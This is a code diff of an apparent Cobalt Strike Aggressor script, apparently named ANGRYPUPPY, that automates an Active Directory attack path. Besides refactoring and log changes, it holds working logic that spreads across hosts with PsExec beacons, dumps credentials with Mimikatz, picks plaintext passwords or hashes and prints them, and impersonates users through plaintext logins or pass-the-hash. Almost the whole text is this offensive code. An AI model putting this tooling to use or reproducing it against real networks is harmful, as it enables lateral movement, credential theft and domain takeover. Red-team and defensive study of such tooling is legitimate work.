@@ -185,36 +185,36 @@ sub parseGraph {
 
     if (@final[0]["type"] eq "Computer"){
         println("First computer detected [!!!]");
-    	$cLabel = @final[0]["label"];
-    	foreach $session (beacons()) {
-			if ($cLabel eq $session["computer"]) {
-				$currentBid = $session["id"];
-			}
-		}
-	}
+        $cLabel = @final[0]["label"];
+        foreach $session (beacons()) {
+            if ($cLabel eq $session["computer"]) {
+                $currentBid = $session["id"];
+            }
+        }
+    }
     else{
         println("First user detected [!!!]");
-    	# Start node is a user
-    	$uLabel = uc(@final[0]["label"]);
+        # Start node is a user
+        $uLabel = uc(@final[0]["label"]);
         println($uLabel);
-    	foreach $session (beacons()) {
+        foreach $session (beacons()) {
             println($uLabel . " vs ". uc($session["user"]));
-			if ($uLabel eq uc($session["user"])) {
-				$currentBid = $session["id"];
-			}
-		}
+            if ($uLabel eq uc($session["user"])) {
+                $currentBid = $session["id"];
+            }
+        }
     }
 
-    foreach @a (@final){
-        if (@a["type"] eq "Computer"){
-            println("PSEXEC to " . @a["label"]);
+    foreach %a (@final){
+        if (%a["type"] eq "Computer"){
+            println("PSEXEC to " . %a["label"]);
         }
         else{
-            println("Mimikatz for " . @a["label"]);
+            println("Mimikatz for " . %a["label"]);
         }
     }
 
-    println("[*] CurrentBid is $currentBid");
+    elog("[*] CurrentBid is $currentBid");
 
     $AttackActive = $False;
 
@@ -226,7 +226,7 @@ sub parseGraph {
     	$listener = $1;
         $psexec = $False;
         $mimikatz = $False;
-        @rSet = @("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9");
+        @rSet = @("a","b","c","d","e","f","0","1","2","3","4","5","6","7","8","9");
 
         $rString = "";
         for ($x = 0; $x lt 7; $x++){
@@ -239,144 +239,148 @@ sub parseGraph {
         $waitFor = "";
 
         $attackActive = $True;
-        println("[*] Attack Activated");
+        elog("[*] ANGRYPUPPY activated: $randomPuppy");
 
         $pos = 0;
 	}, $bids => $1));
 
 }
 
+sub executeAttack {
+    println("[*] Executing after 5s");
+    # Ignore current node 0 as it's the first node and our machine. So loop all the way to the end.
+    $next = @final[$pos + 1];
+    $nextLabel = uc($next["label"]);
+
+    if (@final[$pos + 1]["type"] eq "Computer"){
+        println("[LATERAL] : $nextLabel");
+
+        #PSEXEC here
+        if ($psexec eq $False){
+            bpsexec_psh($currentBid, $nextLabel, $listener);
+            $psexec = $True;
+            #bpause($1, 10000);
+            bstage($1, $null, $listener);
+        }
+
+        if ($waitFor eq $nextLabel) {
+            # We got the beacon back and change the bid to the new one
+            foreach $session (beacons()) {
+                $comp = $session["computer"];
+                $note = $session["note"];
+                if (($comp eq $nextLabel) && ($note eq "ANGRYPUPPY" . $randomPuppy)) {
+                    $currentBid = $session["id"];
+                    break;
+                }
+            }
+            if (binfo($currentBid,"computer") eq $nextLabel){
+                # All good to go
+                $pos = $pos + 1;
+                $psexec = $False;
+
+            }
+        }
+        else if ($waitFor ne "") {
+        # Error occured, let's reset waitFor
+        $waitFor = "";
+        println("Error: WaitFor override with wrong beacon");
+        }
+
+    }
+    else {
+        println("[MIMIKATZ]: $nextLabel");
+
+        # At this point we already know we have a COMPUTER sesssion going, with SYSTEM, so we can just scrape the credentials.
+        # If all works fine, $currentBid contains the machine we are working on and should be scraping creds from
+
+        # MIMIKATZ HERE
+
+        println("Mimikatz: " . $mimikatz);
+        println("Wait For: " . $waitFor);
+        println("Next Label: " . $nextLabel);
+
+        if ($mimikatz eq $False) {
+            blogonpasswords($currentBid);
+            $mimikatz = $True;
+            $waitFor = "";
+            #bpause($currentBid, 5000);
+        }
+
+        if ($waitFor eq $nextLabel) {
+            # We got the set of credentials we need in the cred store, we want to grab it out now.
+
+            $plaintext = $False;
+            $hashes = $False;
+            foreach $cred (credentials()){
+                println("Comparing " . $cred["user"] . " vs. " . $nextLabel);
+                if (($nextLabel eq uc($cred["user"])) && ($cred["password"] !ismatch "[0-9a-f]{32}")) {
+                    # Current $Cred object 
+                    $targetCreds = $cred;
+                    $plaintext = $True;
+                    break;
+                }
+            }
+            # Plaintext found? If not, let's go for a look at finding hashes.
+            if ($plaintext eq $False){
+                foreach $cred (credentials()){
+                    if ($nextLabel eq uc($cred["user"])) {
+                        # Current $Cred object 
+                        $targetCreds = $cred;
+                        $hashes = $True;
+                        $plaintext = $False;
+                        break;
+                    }
+                }
+            }
+
+            if (($plaintext eq $True || $hashes eq $True) && (uc($targetCreds["user"]) eq $nextLabel)) {
+                # All good to go
+
+                # We have a plaintext or hash, so go ahead and get into context.
+
+                $domain = $targetCreds["realm"];
+                $user = $targetCreds["user"];
+                $password = $targetCreds["password"];
+
+                println("Domain: " . $domain);
+                println("User: " . $user);
+                println("Password: " . $password);
+
+                if ($plaintext eq $True){
+                    println("Using PLAIN TEXT LOGIN");
+                    bloginuser($currentBid, $domain, $user, $password);
+                }
+                else {
+                    # Must be a password hash at this point
+                    println("Using PASS THE HASH");
+                    bpassthehash($currentBid, $domain, $user, $password);
+                }
+                #bpause($currentBid, 5000);
+
+                $pos = $pos + 1;
+                $mimikatz = $False;
+            }
+            else{
+                println("Credentials are not found in credential store for the target");
+            }
+        }
+        else if ($waitFor ne "") {
+            println("Error: WaitFor override with wrong credentials");
+            println($waitFor . " vs. " . $nextLabel);
+        }
+    }
+    if ($pos eq (size(@final) - 1)){
+        # Finished attack path
+
+        elog("[*] Attack finished");
+        $attackActive = $False;
+    }
+}
+
 on heartbeat_1s{
 
     if ($attackActive eq $True){
-        println("[*] Executing after 5s");
-        # Ignore current node 0 as it's the first node and our machine. So loop all the way to the end.
-        $next = @final[$pos + 1];
-        $nextLabel = uc($next["label"]);
-
-        if (@final[$pos + 1]["type"] eq "Computer"){
-            println("[LATERAL] : $nextLabel");
-
-            #PSEXEC here
-            if ($psexec eq $False){
-                bpsexec_psh($currentBid, $nextLabel, $listener);
-                $psexec = $True;
-                #bpause($1, 10000);
-                bstage($1, $null, $listener);
-            }
-
-            if ($waitFor eq $nextLabel) {
-                # We got the beacon back and change the bid to the new one
-                foreach $session (beacons()) {
-                    $comp = $session["computer"];
-                    $note = $session["note"];
-                    if (($comp eq $nextLabel) && ($note eq "ANGRYPUPPY" . $randomPuppy)) {
-                        $currentBid = $session["id"];
-                        break;
-                    }
-                }
-                if (binfo($currentBid,"computer") eq $nextLabel){
-                    # All good to go
-                    $pos = $pos + 1;
-                    $psexec = $False;
-
-                }
-            }
-            else if ($waitFor ne "") {
-            # Error occured, let's reset waitFor
-            $waitFor = "";
-            println("Error: WaitFor override with wrong beacon");
-            }
-
-        }
-        else {
-            println("[MIMIKATZ]: $nextLabel");
-
-            # At this point we already know we have a COMPUTER sesssion going, with SYSTEM, so we can just scrape the credentials.
-            # If all works fine, $currentBid contains the machine we are working on and should be scraping creds from
-
-            # MIMIKATZ HERE
-
-            println("Mimikatz: " . $mimikatz);
-            println("Wait For: " . $waitFor);
-            println("Next Label: " . $nextLabel);
-
-            if ($mimikatz eq $False) {
-                blogonpasswords($currentBid);
-                $mimikatz = $True;
-                $waitFor = "";
-                #bpause($currentBid, 5000);
-            }
-
-            if ($waitFor eq $nextLabel) {
-                # We got the set of credentials we need in the cred store, we want to grab it out now.
-
-                $plaintext = $False;
-                $hashes = $False;
-                foreach $cred (credentials()){
-                    println("Comparing " . $cred["user"] . " vs. " . $nextLabel);
-                    if (($nextLabel eq uc($cred["user"])) && ($cred["password"] !ismatch "[0-9a-f]{32}")) {
-                        # Current $Cred object 
-                        $targetCreds = $cred;
-                        $plaintext = $True;
-                        break;
-                    }
-                }
-                # Plaintext found? If not, let's go for a look at finding hashes.
-                if ($plaintext eq $False){
-                    foreach $cred (credentials()){
-                        if ($nextLabel eq uc($cred["user"])) {
-                            # Current $Cred object 
-                            $targetCreds = $cred;
-                            $hashes = $True;
-                            $plaintext = $False;
-                            break;
-                        }
-                    }
-                }
-
-                if (($plaintext eq $True || $hashes eq $True) && (uc($targetCreds["user"]) eq $nextLabel)) {
-                    # All good to go
-
-                    # We have a plaintext or hash, so go ahead and get into context.
-
-                    $domain = $targetCreds["realm"];
-                    $user = $targetCreds["user"];
-                    $password = $targetCreds["password"];
-
-                    println("Domain: " . $domain);
-                    println("User: " . $user);
-                    println("Password: " . $password);
-
-                    if ($plaintext eq $True){
-                        println("Using PLAIN TEXT LOGIN");
-                        bloginuser($currentBid, $domain, $user, $password);
-                    }
-                    else {
-                        # Must be a password hash at this point
-                        println("Using PASS THE HASH");
-                        bpassthehash($currentBid, $domain, $user, $password);
-                    }
-                    #bpause($currentBid, 5000);
-
-                    $pos = $pos + 1;
-                    $mimikatz = $False;
-                }
-                else{
-                    println("Credentials are not found in credential store for the target");
-                }
-            }
-            else if ($waitFor ne "") {
-                println("Error: WaitFor override with wrong credentials");
-                println($waitFor . " vs. " . $nextLabel);
-            }
-        }
-        if ($pos eq (size(@final) - 1)){
-            # Finished attack path
-
-            println("[*] Attack finished");
-            $attackActive = $False;
-        }
+        executeAttack();
     }	# End $AttackActive
 }
 
